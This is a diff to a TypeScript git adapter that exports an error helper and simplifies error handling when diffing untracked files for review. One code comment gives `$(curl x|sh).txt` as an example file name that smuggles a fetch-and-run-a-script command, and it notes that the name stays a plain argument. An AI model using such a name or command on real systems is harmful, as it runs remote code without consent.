@@ -63,7 +63,7 @@ export function assertCreatableBranchName(branch: string, repoRoot: string): voi
 }
 
 /** Short reason from a failed git call: its stderr's first line, else the message. */
-function reasonOf(err: unknown): string {
+export function reasonOf(err: unknown): string {
   const e = err as { stderr?: string | Buffer; message?: string } | undefined;
   const stderr = e?.stderr?.toString().trim();
   const text = stderr || e?.message || String(err);
@@ -280,16 +280,14 @@ export class GitCliAdapter implements IGitPort {
     for (const file of files) {
       // The name is whatever the agent called the file — `$(curl x|sh).txt`
       // included. It is one argv entry here, never shell text.
-      try {
-        out += await git(['diff', '--no-index', '--', '/dev/null', file], cwd);
-      } catch (err) {
+      out += await git(['diff', '--no-index', '--', '/dev/null', file], cwd).catch((err: unknown) => {
         // --no-index exits 1 when the files differ, which against /dev/null is
         // always; the diff is on stdout all the same. Any other exit is a file
         // git could not read (vanished mid-listing, permissions) — skipped, so
         // one bad file does not hide the rest of the review.
         const e = err as { code?: unknown; stdout?: unknown };
-        if (e.code === 1 && typeof e.stdout === 'string') out += e.stdout;
-      }
+        return e.code === 1 && typeof e.stdout === 'string' ? e.stdout : '';
+      });
     }
     return out;
   }
